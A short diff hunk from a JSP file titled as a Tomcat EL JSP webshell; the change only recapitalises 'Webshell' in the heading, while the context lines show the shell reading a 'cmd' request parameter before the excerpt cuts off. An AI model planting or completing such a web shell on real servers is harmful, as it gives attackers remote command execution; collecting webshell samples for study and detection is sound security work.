@@ -6,7 +6,7 @@
 <%@ page import="sun.misc.IOUtils" %>
 <html>
 <body>
-<h2>Tomcat EL的JSP Webshell - 2</h2>
+<h2>Tomcat EL的JSP WebShell - 2</h2>
 <%
     String cmd = request.getParameter("cmd");
     StringBuilder stringBuilder = new StringBuilder();
